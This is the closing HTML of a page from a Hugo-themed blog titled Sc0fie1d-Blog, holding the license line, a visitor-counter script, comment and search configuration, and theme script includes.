                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div>
    
        
        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
    

    
        
            <section>
                
                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
                        
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                

                
                    &nbsp;|&nbsp;              
                

                
                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
                        
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
            </section>
        

        
        
    

</footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
</body>

</html>